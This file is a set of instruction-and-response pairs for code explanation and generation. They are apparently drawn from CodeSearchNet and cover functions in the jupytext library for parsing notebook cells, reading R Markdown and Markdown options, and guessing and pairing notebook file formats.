{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef find_cell_end(self, lines):\n\n        if self.cell_type == 'markdown':\n            # Empty cell \"\" or ''\n            if len(self.markdown_marker) <= 2:\n                if len(lines) == 1 or _BLANK_LINE.match(lines[1]):\n                    return 0, 2, True\n                return 0, 1, True\n\n            # Multi-line comment with triple quote\n            if len(self.markdown_marker) == 3:\n                for i, line in enumerate(lines):\n                    if (i > 0 or line.strip() != self.markdown_marker) and line.rstrip().endswith(self.markdown_marker):\n                        explicit_end_of_cell_marker = line.strip() == self.markdown_marker\n                        if explicit_end_of_cell_marker:\n                            end_of_cell = i\n                        else:\n                            end_of_cell = i + 1\n                        if len(lines) <= i + 1 or _BLANK_LINE.match(\n                                lines[i + 1]):\n                            return end_of_cell, i + 2, explicit_end_of_cell_marker\n                        return end_of_cell, i + 1, explicit_end_of_cell_marker\n            else:\n                # 20 # or more\n                for i, line in enumerate(lines[1:], 1):\n                    if not line.startswith(self.comment):\n                        if _BLANK_LINE.match(line):\n                            return i, i + 1, False\n                        return i, i, False\n\n        elif self.cell_type == 'code':\n            parser = StringParser('python')\n            for i, line in enumerate(lines):\n                if parser.is_quoted():\n                    parser.read_line(line)\n                    continue\n\n                if self.start_of_new_markdown_cell(line):\n                    if i > 0 and _BLANK_LINE.match(lines[i - 1]):\n                        return i - 1, i, False\n                    return i, i, False\n                parser.read_line(line)\n\n        return len(lines), len(lines), False", "response": "Return the position of the end of the cell and whether there was an explicit end of cell marker or not."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef find_cell_content(self, lines):\n        cell_end_marker, next_cell_start, explicit_eoc = self.find_cell_end(lines)\n\n        # Metadata to dict\n        cell_start = 0\n        if self.cell_type == 'markdown':\n            if self.markdown_marker in ['\"\"\"', \"'''\"]:\n                # Remove the triple quotes\n                if lines[0].strip() == self.markdown_marker:\n                    cell_start = 1\n                else:\n                    lines[0] = lines[0][3:]\n                if not explicit_eoc:\n                    last = lines[cell_end_marker - 1]\n                    lines[cell_end_marker - 1] = last[:last.rfind(self.markdown_marker)]\n            if self.twenty_hash.match(self.markdown_marker):\n                cell_start = 1\n        else:\n            self.metadata = {}\n\n        # Cell content\n        source = lines[cell_start:cell_end_marker]\n        self.org_content = [line for line in source]\n\n        if self.cell_type == 'code' and self.comment_magics:\n            uncomment_magic(source, self.language or self.default_language)\n\n        if self.cell_type == 'markdown' and source:\n            if self.markdown_marker.startswith(self.comment):\n                source = uncomment(source, self.comment)\n            if self.rst2md:\n                if rst2md:\n                    source = rst2md('\\n'.join(source)).splitlines()\n                else:\n                    raise ImportError('Could not import rst2md from sphinx_gallery.notebook')\n\n        self.content = source\n\n        self.lines_to_next_cell = count_lines_to_next_cell(\n            cell_end_marker,\n            next_cell_start,\n            len(lines),\n            explicit_eoc)\n\n        return next_cell_start", "response": "Parse the cell till its end and set content and lines_to_next_cell."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngives a path and options for a format return the corresponding base path", "response": "def base_path(main_path, fmt):\n    \"\"\"Given a path and options for a format (ext, suffix, prefix), return the corresponding base path\"\"\"\n    if not fmt:\n        return os.path.splitext(main_path)[0]\n\n    fmt = long_form_one_format(fmt)\n    fmt_ext = fmt['extension']\n    suffix = fmt.get('suffix')\n    prefix = fmt.get('prefix')\n\n    base, ext = os.path.splitext(main_path)\n    if ext != fmt_ext:\n        raise InconsistentPath(u\"Notebook path '{}' was expected to have extension '{}'\".format(main_path, fmt_ext))\n\n    if suffix:\n        if not base.endswith(suffix):\n            raise InconsistentPath(u\"Notebook name '{}' was expected to end with suffix '{}'\".format(base, suffix))\n        base = base[:-len(suffix)]\n\n    if not prefix:\n        return base\n\n    prefix_dir, prefix_file_name = os.path.split(prefix)\n    notebook_dir, notebook_file_name = os.path.split(base)\n    sep = base[len(notebook_dir):-len(notebook_file_name)]\n\n    if prefix_file_name:\n        if not notebook_file_name.startswith(prefix_file_name):\n            raise InconsistentPath(u\"Notebook name '{}' was expected to start with prefix '{}'\"\n                                   .format(notebook_file_name, prefix_file_name))\n        notebook_file_name = notebook_file_name[len(prefix_file_name):]\n\n    if prefix_dir:\n        if not notebook_dir.endswith(prefix_dir):\n            raise InconsistentPath(u\"Notebook directory '{}' was expected to end with directory prefix '{}'\"\n                                   .format(notebook_dir, prefix_dir))\n        notebook_dir = notebook_dir[:-len(prefix_dir)]\n\n    if not notebook_dir:\n        return notebook_file_name\n\n    # Does notebook_dir ends with a path separator?\n    if notebook_dir[-1:] == sep:\n        return notebook_dir + notebook_file_name\n\n    return notebook_dir + sep + notebook_file_name"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the full path for the notebook given the base path and the format dictionary", "response": "def full_path(base, fmt):\n    \"\"\"Return the full path for the notebook, given the base path\"\"\"\n    ext = fmt['extension']\n    suffix = fmt.get('suffix')\n    prefix = fmt.get('prefix')\n\n    full = base\n\n    if prefix:\n        prefix_dir, prefix_file_name = os.path.split(prefix)\n        notebook_dir, notebook_file_name = os.path.split(base)\n\n        # Local path separator (\\\\ on windows)\n        sep = base[len(notebook_dir):-len(notebook_file_name)] or '/'\n        prefix_dir = prefix_dir.replace('/', sep)\n\n        if prefix_file_name:\n            notebook_file_name = prefix_file_name + notebook_file_name\n\n        if prefix_dir:\n            # Do not add a path separator when notebook_dir is '/'\n            if notebook_dir and not notebook_dir.endswith(sep):\n                notebook_dir = notebook_dir + sep\n            notebook_dir = notebook_dir + prefix_dir\n\n        if notebook_dir and not notebook_dir.endswith(sep):\n            notebook_dir = notebook_dir + sep\n\n        full = notebook_dir + notebook_file_name\n\n    if suffix:\n        full = full + suffix\n\n    return full + ext"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef find_base_path_and_format(main_path, formats):\n    for fmt in formats:\n        try:\n            return base_path(main_path, fmt), fmt\n        except InconsistentPath:\n            continue\n\n    raise InconsistentPath(u\"Path '{}' matches none of the export formats. \"\n                           \"Please make sure that jupytext.formats covers the current file \"\n                           \"(e.g. add '{}' to the export formats)\".format(main_path,\n                                                                          os.path.splitext(main_path)[1][1:]))", "response": "Find the base path and the format corresponding to the given path"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef paired_paths(main_path, fmt, formats):\n    if not formats:\n        return [(main_path, {'extension': os.path.splitext(main_path)[1]})]\n\n    formats = long_form_multiple_formats(formats)\n\n    # Is there a format that matches the main path?\n    base = base_path(main_path, fmt)\n    paths = [full_path(base, fmt) for fmt in formats]\n\n    if main_path not in paths:\n        raise InconsistentPath(u\"Paired paths '{}' do not include the current notebook path '{}'. \"\n                               u\"Current format is '{}', and paired formats are '{}'.\"\n                               .format(\"','\".join(paths), main_path, short_form_one_format(fmt),\n                                       short_form_multiple_formats(formats)))\n\n    if len(paths) > len(set(paths)):\n        raise InconsistentPath(u'Duplicate paired paths for this notebook. Please fix jupytext.formats.')\n\n    return list(zip(paths, formats))", "response": "Return the list of paired notebooks given main path and the list of formats"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconverts the metadata dictionary to their rmd representation.", "response": "def metadata_to_rmd_options(language, metadata):\n    \"\"\"\n    Convert language and metadata information to their rmd representation\n    :param language:\n    :param metadata:\n    :return:\n    \"\"\"\n    options = (language or 'R').lower()\n    if 'name' in metadata:\n        options += ' ' + metadata['name'] + ','\n        del metadata['name']\n    for jupyter_option, rmd_option, rev in _BOOLEAN_OPTIONS_DICTIONARY:\n        if jupyter_option in metadata:\n            options += ' {}={},'.format(\n                rmd_option, _r_logical_values(metadata[jupyter_option] != rev))\n            del metadata[jupyter_option]\n    for opt_name in metadata:\n        opt_value = metadata[opt_name]\n        opt_name = opt_name.strip()\n        if opt_name == 'active':\n            options += ' {}=\"{}\",'.format(opt_name, str(opt_value))\n        elif isinstance(opt_value, bool):\n            options += ' {}={},'.format(\n                opt_name, 'TRUE' if opt_value else 'FALSE')\n        elif isinstance(opt_value, list):\n            options += ' {}={},'.format(\n                opt_name, 'c({})'.format(\n                    ', '.join(['\"{}\"'.format(str(v)) for v in opt_value])))\n        else:\n            options += ' {}={},'.format(opt_name, str(opt_value))\n    if not language:\n        options = options[2:]\n    return options.strip(',').strip()"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates metadata based on the _BOOLEAN_OPTIONS_DICTIONARY mapping.", "response": "def update_metadata_from_rmd_options(name, value, metadata):\n    \"\"\"\n    Update metadata using the _BOOLEAN_OPTIONS_DICTIONARY mapping\n    :param name: option name\n    :param value: option value\n    :param metadata:\n    :return:\n    \"\"\"\n    for jupyter_option, rmd_option, rev in _BOOLEAN_OPTIONS_DICTIONARY:\n        if name == rmd_option:\n            try:\n                metadata[jupyter_option] = _py_logical_values(value) != rev\n                return True\n            except RLogicalValueError:\n                pass\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef parse_rmd_options(line):\n    parsing_context = ParsingContext(line)\n\n    result = []\n    prev_char = ''\n\n    name = ''\n    value = ''\n\n    for char in ',' + line + ',':\n        if parsing_context.in_global_expression():\n            if char == ',':\n                if name != '' or value != '':\n                    if result and name == '':\n                        raise RMarkdownOptionParsingError(\n                            'Option line \"{}\" has no name for '\n                            'option value {}'.format(line, value))\n                    result.append((name.strip(), value.strip()))\n                    name = ''\n                    value = ''\n            elif char == '=':\n                if name == '':\n                    name = value\n                    value = ''\n                else:\n                    value += char\n            else:\n                parsing_context.count_special_chars(char, prev_char)\n                value += char\n        else:\n            parsing_context.count_special_chars(char, prev_char)\n            value += char\n        prev_char = char\n\n    if not parsing_context.in_global_expression():\n        raise RMarkdownOptionParsingError(\n            'Option line \"{}\" is not properly terminated'.format(line))\n\n    return result", "response": "Parses a R markdown option line into a list of pairs name value."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef rmd_options_to_metadata(options):\n    options = re.split(r'\\s|,', options, 1)\n    if len(options) == 1:\n        language = options[0]\n        chunk_options = []\n    else:\n        language, others = options\n        language = language.rstrip(' ,')\n        others = others.lstrip(' ,')\n        chunk_options = parse_rmd_options(others)\n\n    language = 'R' if language == 'r' else language\n    metadata = {}\n    for i, opt in enumerate(chunk_options):\n        name, value = opt\n        if i == 0 and name == '':\n            metadata['name'] = value\n            continue\n        else:\n            if update_metadata_from_rmd_options(name, value, metadata):\n                continue\n            try:\n                metadata[name] = _py_logical_values(value)\n                continue\n            except RLogicalValueError:\n                metadata[name] = value\n\n    for name in metadata:\n        try_eval_metadata(metadata, name)\n\n    if ('active' in metadata or metadata.get('run_control', {}).get('frozen') is True) and 'eval' in metadata:\n        del metadata['eval']\n\n    return metadata.get('language') or language, metadata", "response": "Parse the options and return a metadata dictionary."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef metadata_to_md_options(metadata):\n\n    return ' '.join([\"{}={}\".format(key, dumps(metadata[key]))\n                     if metadata[key] is not None else key for key in metadata])", "response": "Encode metadata into md options"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_md_code_options(options):\n\n    metadata = []\n    while options:\n        name_and_value = re.split(r'[\\s=]+', options, maxsplit=1)\n        name = name_and_value[0]\n\n        # Equal sign in between name and what's next?\n        if len(name_and_value) == 2:\n            sep = options[len(name):-len(name_and_value[1])]\n            has_value = sep.find('=') >= 0\n            options = name_and_value[1]\n        else:\n            has_value = False\n            options = ''\n\n        if not has_value:\n            metadata.append((name, None))\n            continue\n\n        try:\n            value = loads(options)\n            options = ''\n        except JSONDecodeError as err:\n            try:\n                split = err.colno - 1\n            except AttributeError:\n                # str(err) is like: \"ValueError: Extra data: line 1 column 7 - line 1 column 50 (char 6 - 49)\"\n                match = re.match(r'.*char ([0-9]*)', str(err))\n                split = int(match.groups()[0])\n\n            value = loads(options[:split])\n            options = options[split:]\n\n        metadata.append((name, value))\n\n    return metadata", "response": "Parse the md code options into a list of tuples."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef md_options_to_metadata(options):\n    metadata = parse_md_code_options(options)\n\n    if metadata:\n        language = metadata[0][0]\n        for lang in _JUPYTER_LANGUAGES + ['julia', 'scheme', 'c++']:\n            if language.lower() == lang.lower():\n                return lang, dict(metadata[1:])\n\n    return None, dict(metadata)", "response": "Parse markdown options and return language and metadata"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nevaluate given metadata to a python object if possible", "response": "def try_eval_metadata(metadata, name):\n    \"\"\"Evaluate given metadata to a python object, if possible\"\"\"\n    value = metadata[name]\n    if not isinstance(value, (str, unicode)):\n        return\n    if (value.startswith('\"') and value.endswith('\"')) or (value.startswith(\"'\") and value.endswith(\"'\")):\n        if name in ['active', 'magic_args', 'language']:\n            metadata[name] = value[1:-1]\n        return\n    if value.startswith('c(') and value.endswith(')'):\n        value = '[' + value[2:-1] + ']'\n    elif value.startswith('list(') and value.endswith(')'):\n        value = '[' + value[5:-1] + ']'\n    try:\n        metadata[name] = ast.literal_eval(value)\n    except (SyntaxError, ValueError):\n        return"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreading metadata from its json representation", "response": "def json_options_to_metadata(options, add_brackets=True):\n    \"\"\"Read metadata from its json representation\"\"\"\n    try:\n        options = loads('{' + options + '}' if add_brackets else options)\n        return options\n    except ValueError:\n        return {}"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nis the cell active for the given file extension?", "response": "def is_active(ext, metadata):\n    \"\"\"Is the cell active for the given file extension?\"\"\"\n    if metadata.get('run_control', {}).get('frozen') is True:\n        return False\n    if 'active' not in metadata:\n        return True\n    return ext.replace('.', '') in re.split('\\\\.|,', metadata['active'])"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses double percent options and return metadata dict.", "response": "def double_percent_options_to_metadata(options):\n    \"\"\"Parse double percent options\"\"\"\n    matches = _PERCENT_CELL.findall('# %%' + options)\n\n    # Fail safe when regexp matching fails #116\n    # (occurs e.g. if square brackets are found in the title)\n    if not matches:\n        return {'title': options.strip()}\n\n    matches = matches[0]\n\n    # Fifth match are JSON metadata\n    if matches[4]:\n        metadata = json_options_to_metadata(matches[4], add_brackets=False)\n    else:\n        metadata = {}\n\n    # Third match is cell type\n    cell_type = matches[2]\n    if cell_type:\n        metadata['cell_type'] = cell_type[1:-1]\n\n    # Second and fourth match are description\n    title = [matches[i].strip() for i in [1, 3]]\n    title = [part for part in title if part]\n    if title:\n        title = ' '.join(title)\n        cell_depth = 0\n        while title.startswith('%'):\n            cell_depth += 1\n            title = title[1:]\n\n        if cell_depth:\n            metadata['cell_depth'] = cell_depth\n        metadata['title'] = title.strip()\n\n    return metadata"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef in_global_expression(self):\n        return (self.parenthesis_count == 0 and self.curly_bracket_count == 0\n                and self.square_bracket_count == 0\n                and not self.in_single_quote and not self.in_double_quote)", "response": "Currently inside an expression"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nupdating parentheses counters and square brackets counters and special characters.", "response": "def count_special_chars(self, char, prev_char):\n        \"\"\"Update parenthesis counters\"\"\"\n        if char == '(':\n            self.parenthesis_count += 1\n        elif char == ')':\n            self.parenthesis_count -= 1\n            if self.parenthesis_count < 0:\n                raise RMarkdownOptionParsingError(\n                    'Option line \"{}\" has too many '\n                    'closing parentheses'.format(self.line))\n        elif char == '{':\n            self.curly_bracket_count += 1\n        elif char == '}':\n            self.curly_bracket_count -= 1\n            if self.curly_bracket_count < 0:\n                raise RMarkdownOptionParsingError(\n                    'Option line \"{}\" has too many '\n                    'closing curly brackets'.format(self.line))\n        elif char == '[':\n            self.square_bracket_count += 1\n        elif char == ']':\n            self.square_bracket_count -= 1\n            if self.square_bracket_count < 0:\n                raise RMarkdownOptionParsingError(\n                    'Option line \"{}\" has too many '\n                    'closing square brackets'.format(self.line))\n        elif char == \"'\" and prev_char != '\\\\':\n            self.in_single_quote = not self.in_single_quote\n        elif char == '\"' and prev_char != '\\\\':\n            self.in_double_quote = not self.in_double_quote"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_format_implementation(ext, format_name=None):\n    # remove pre-extension if any\n    ext = '.' + ext.split('.')[-1]\n\n    formats_for_extension = []\n    for fmt in JUPYTEXT_FORMATS:\n        if fmt.extension == ext:\n            if fmt.format_name == format_name or not format_name:\n                return fmt\n            formats_for_extension.append(fmt.format_name)\n\n    if formats_for_extension:\n        if ext == '.md' and format_name == 'pandoc':\n            raise JupytextFormatError('Please install pandoc>=2.7.2')\n\n        raise JupytextFormatError(\"Format '{}' is not associated to extension '{}'. \"\n                                  \"Please choose one of: {}.\".format(format_name, ext,\n                                                                     ', '.join(formats_for_extension)))\n    raise JupytextFormatError(\"No format associated to extension '{}'\".format(ext))", "response": "Returns the implementation for the desired format"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef read_metadata(text, ext):\n    ext = '.' + ext.split('.')[-1]\n    lines = text.splitlines()\n\n    if ext in ['.md', '.Rmd']:\n        comment = ''\n    else:\n        comment = _SCRIPT_EXTENSIONS.get(ext, {}).get('comment', '#')\n\n    metadata, _, _, _ = header_to_metadata_and_cell(lines, comment, ext)\n    if ext in ['.r', '.R'] and not metadata:\n        metadata, _, _, _ = header_to_metadata_and_cell(lines, \"#'\", ext)\n\n    return metadata", "response": "Return the header metadata"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef read_format_from_metadata(text, ext):\n    metadata = read_metadata(text, ext)\n    rearrange_jupytext_metadata(metadata)\n    return format_name_for_ext(metadata, ext, explicit_default=False)", "response": "Return the format of the file when that information is available from the metadata"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef guess_format(text, ext):\n    lines = text.splitlines()\n\n    metadata = read_metadata(text, ext)\n\n    if ('jupytext' in metadata and set(metadata['jupytext'])\n            .difference(['encoding', 'executable', 'main_language'])) or \\\n            set(metadata).difference(['jupytext']):\n        return format_name_for_ext(metadata, ext), {}\n\n    # Is this a Hydrogen-like script?\n    # Or a Sphinx-gallery script?\n    if ext in _SCRIPT_EXTENSIONS:\n        comment = _SCRIPT_EXTENSIONS[ext]['comment']\n        twenty_hash = ''.join(['#'] * 20)\n        magic_re = re.compile(r'^(%|%%|%%%)[a-zA-Z]')\n        double_percent_re = re.compile(r'^{}( %%|%%)$'.format(comment))\n        double_percent_and_space_re = re.compile(r'^{}( %%|%%)\\s'.format(comment))\n        nbconvert_script_re = re.compile(r'^{}( <codecell>| In\\[[0-9 ]*\\]:?)'.format(comment))\n        vim_folding_markers_re = re.compile(r'^{}\\s*'.format(comment) + '{{{')\n        vscode_folding_markers_re = re.compile(r'^{}\\s*region'.format(comment))\n\n        twenty_hash_count = 0\n        double_percent_count = 0\n        magic_command_count = 0\n        rspin_comment_count = 0\n        vim_folding_markers_count = 0\n        vscode_folding_markers_count = 0\n\n        parser = StringParser(language='R' if ext in ['.r', '.R'] else 'python')\n        for line in lines:\n            parser.read_line(line)\n            if parser.is_quoted():\n                continue\n\n            # Don't count escaped Jupyter magics (no space between %% and command) as cells\n            if double_percent_re.match(line) or double_percent_and_space_re.match(line) or \\\n                    nbconvert_script_re.match(line):\n                double_percent_count += 1\n\n            if magic_re.match(line):\n                magic_command_count += 1\n\n            if line.startswith(twenty_hash) and ext == '.py':\n                twenty_hash_count += 1\n\n            if line.startswith(\"#'\") and ext in ['.R', '.r']:\n                rspin_comment_count += 1\n\n            if vim_folding_markers_re.match(line):\n                vim_folding_markers_count += 1\n\n            if vscode_folding_markers_re.match(line):\n                vscode_folding_markers_count += 1\n\n        if double_percent_count >= 1:\n            if magic_command_count:\n                return 'hydrogen', {}\n            return 'percent', {}\n\n        if vim_folding_markers_count:\n            return 'light', {'cell_markers': '{{{,}}}'}\n\n        if vscode_folding_markers_count:\n            return 'light', {'cell_markers': 'region,endregion'}\n\n        if twenty_hash_count >= 2:\n            return 'sphinx', {}\n\n        if rspin_comment_count >= 1:\n            return 'spin', {}\n\n    if ext == '.md':\n        for line in lines:\n            if line.startswith(':::'):  # Pandoc div\n                return 'pandoc', {}\n\n    # Default format\n    return get_format_implementation(ext).format_name, {}", "response": "Guess the format and format options of the file given its extension and content"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nguess the format of the notebook based on its content.", "response": "def divine_format(text):\n    \"\"\"Guess the format of the notebook, based on its content #148\"\"\"\n    try:\n        nbformat.reads(text, as_version=4)\n        return 'ipynb'\n    except nbformat.reader.NotJSONError:\n        pass\n\n    lines = text.splitlines()\n    for comment in ['', '#'] + _COMMENT_CHARS:\n        metadata, _, _, _ = header_to_metadata_and_cell(lines, comment)\n        ext = metadata.get('jupytext', {}).get('text_representation', {}).get('extension')\n        if ext:\n            return ext[1:] + ':' + guess_format(text, ext)[0]\n\n    # No metadata, but ``` on at least one line => markdown\n    for line in lines:\n        if line == '```':\n            return 'md'\n\n    return 'py:' + guess_format(text, '.py')[0]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nraising if file version in source file would override outputs", "response": "def check_file_version(notebook, source_path, outputs_path):\n    \"\"\"Raise if file version in source file would override outputs\"\"\"\n    if not insert_or_test_version_number():\n        return\n\n    _, ext = os.path.splitext(source_path)\n    if ext.endswith('.ipynb'):\n        return\n    version = notebook.metadata.get('jupytext', {}).get('text_representation', {}).get('format_version')\n    format_name = format_name_for_ext(notebook.metadata, ext)\n\n    fmt = get_format_implementation(ext, format_name)\n    current = fmt.current_version_number\n\n    # Missing version, still generated by jupytext?\n    if notebook.metadata and not version:\n        version = current\n\n    # Same version? OK\n    if version == fmt.current_version_number:\n        return\n\n    # Version larger than minimum readable version\n    if (fmt.min_readable_version_number or current) <= version <= current:\n        return\n\n    raise JupytextFormatError(\"File {} is in format/version={}/{} (current version is {}). \"\n                              \"It would not be safe to override the source of {} with that file. \"\n                              \"Please remove one or the other file.\"\n                              .format(os.path.basename(source_path),\n                                      format_name, version, current,\n                                      os.path.basename(outputs_path)))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the format name for the given extension", "response": "def format_name_for_ext(metadata, ext, cm_default_formats=None, explicit_default=True):\n    \"\"\"Return the format name for that extension\"\"\"\n    # Is the format information available in the text representation?\n    text_repr = metadata.get('jupytext', {}).get('text_representation', {})\n    if text_repr.get('extension', '').endswith(ext) and text_repr.get('format_name'):\n        return text_repr.get('format_name')\n\n    # Format from jupytext.formats\n    formats = metadata.get('jupytext', {}).get('formats', '') or cm_default_formats\n    formats = long_form_multiple_formats(formats)\n    for fmt in formats:\n        if fmt['extension'] == ext:\n            if (not explicit_default) or fmt.get('format_name'):\n                return fmt.get('format_name')\n\n    if (not explicit_default) or ext in ['.Rmd', '.md']:\n        return None\n\n    return get_format_implementation(ext).format_name"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef identical_format_path(fmt1, fmt2):\n    for key in ['extension', 'prefix', 'suffix']:\n        if fmt1.get(key) != fmt2.get(key):\n            return False\n    return True", "response": "Return True if two formats target the same file."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nupdate the jupytext_format metadata in the Jupyter notebook", "response": "def update_jupytext_formats_metadata(metadata, new_format):\n    \"\"\"Update the jupytext_format metadata in the Jupyter notebook\"\"\"\n    new_format = long_form_one_format(new_format)\n    formats = long_form_multiple_formats(metadata.get('jupytext', {}).get('formats', ''))\n    if not formats:\n        return\n\n    for fmt in formats:\n        if identical_format_path(fmt, new_format):\n            fmt['format_name'] = new_format.get('format_name')\n            break\n\n    metadata.setdefault('jupytext', {})['formats'] = short_form_multiple_formats(formats)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef rearrange_jupytext_metadata(metadata):\n\n    # Backward compatibility with nbrmd\n    for key in ['nbrmd_formats', 'nbrmd_format_version']:\n        if key in metadata:\n            metadata[key.replace('nbrmd', 'jupytext')] = metadata.pop(key)\n\n    jupytext_metadata = metadata.pop('jupytext', {})\n\n    if 'jupytext_formats' in metadata:\n        jupytext_metadata['formats'] = metadata.pop('jupytext_formats')\n    if 'jupytext_format_version' in metadata:\n        jupytext_metadata['text_representation'] = {'format_version': metadata.pop('jupytext_format_version')}\n    if 'main_language' in metadata:\n        jupytext_metadata['main_language'] = metadata.pop('main_language')\n    for entry in ['encoding', 'executable']:\n        if entry in metadata:\n            jupytext_metadata[entry] = metadata.pop(entry)\n\n    filters = jupytext_metadata.pop('metadata_filter', {})\n    if 'notebook' in filters:\n        jupytext_metadata['notebook_metadata_filter'] = filters['notebook']\n    if 'cells' in filters:\n        jupytext_metadata['cell_metadata_filter'] = filters['cells']\n\n    for filter_level in ['notebook_metadata_filter', 'cell_metadata_filter']:\n        if filter_level in jupytext_metadata:\n            jupytext_metadata[filter_level] = metadata_filter_as_string(jupytext_metadata[filter_level])\n\n    if jupytext_metadata.get('text_representation', {}).get('jupytext_version', '').startswith('0.'):\n        formats = jupytext_metadata.get('formats')\n        if formats:\n            jupytext_metadata['formats'] = ','.join(['.' + fmt if fmt.rfind('.') > 0 else fmt\n                                                     for fmt in formats.split(',')])\n\n    # auto to actual extension\n    formats = jupytext_metadata.get('formats')\n    if formats:\n        jupytext_metadata['formats'] = short_form_multiple_formats(long_form_multiple_formats(formats, metadata))\n\n    if jupytext_metadata:\n        metadata['jupytext'] = jupytext_metadata", "response": "Convert the jupytext_formats metadata entry to jupytext format and formats etc. See #91"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef long_form_one_format(jupytext_format, metadata=None, update=None):\n    if isinstance(jupytext_format, dict):\n        if update:\n            jupytext_format.update(update)\n        return validate_one_format(jupytext_format)\n\n    if not jupytext_format:\n        return {}\n\n    common_name_to_ext = {'notebook': 'ipynb',\n                          'rmarkdown': 'Rmd',\n                          'markdown': 'md',\n                          'c++': 'cpp'}\n    if jupytext_format.lower() in common_name_to_ext:\n        jupytext_format = common_name_to_ext[jupytext_format.lower()]\n\n    fmt = {}\n\n    if jupytext_format.rfind('/') > 0:\n        fmt['prefix'], jupytext_format = jupytext_format.rsplit('/', 1)\n\n    if jupytext_format.rfind(':') >= 0:\n        ext, fmt['format_name'] = jupytext_format.rsplit(':', 1)\n    else:\n        ext = jupytext_format\n\n    if ext.rfind('.') > 0:\n        fmt['suffix'], ext = os.path.splitext(ext)\n\n    if not ext.startswith('.'):\n        ext = '.' + ext\n\n    if ext == '.auto':\n        ext = auto_ext_from_metadata(metadata) if metadata is not None else '.auto'\n        if not ext:\n            raise JupytextFormatError(\"No language information in this notebook. Please replace 'auto' with \"\n                                      \"an actual script extension.\")\n\n    fmt['extension'] = ext\n    if update:\n        fmt.update(update)\n    return validate_one_format(fmt)", "response": "Parse a Jupytext format into a list of dictionaries."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nconvert a concise encoding of jupytext. formats to a list of formats encoded as dictionaries", "response": "def long_form_multiple_formats(jupytext_formats, metadata=None):\n    \"\"\"Convert a concise encoding of jupytext.formats to a list of formats, encoded as dictionaries\"\"\"\n    if not jupytext_formats:\n        return []\n\n    if not isinstance(jupytext_formats, list):\n        jupytext_formats = [fmt for fmt in jupytext_formats.split(',') if fmt]\n\n    jupytext_formats = [long_form_one_format(fmt, metadata) for fmt in jupytext_formats]\n\n    return jupytext_formats"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef short_form_one_format(jupytext_format):\n    if not isinstance(jupytext_format, dict):\n        return jupytext_format\n    fmt = jupytext_format['extension']\n    if 'suffix' in jupytext_format:\n        fmt = jupytext_format['suffix'] + fmt\n    elif fmt.startswith('.'):\n        fmt = fmt[1:]\n\n    if 'prefix' in jupytext_format:\n        fmt = jupytext_format['prefix'] + '/' + fmt\n\n    if jupytext_format.get('format_name'):\n        if jupytext_format['extension'] not in ['.md', '.Rmd'] or jupytext_format['format_name'] == 'pandoc':\n            fmt = fmt + ':' + jupytext_format['format_name']\n\n    return fmt", "response": "Represent one jupytext format as a string"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconvert jupytext formats represented as a list of dictionaries to a comma separated list", "response": "def short_form_multiple_formats(jupytext_formats):\n    \"\"\"Convert jupytext formats, represented as a list of dictionaries, to a comma separated list\"\"\"\n    if not isinstance(jupytext_formats, list):\n        return jupytext_formats\n\n    jupytext_formats = [short_form_one_format(fmt) for fmt in jupytext_formats]\n    return ','.join(jupytext_formats)"}
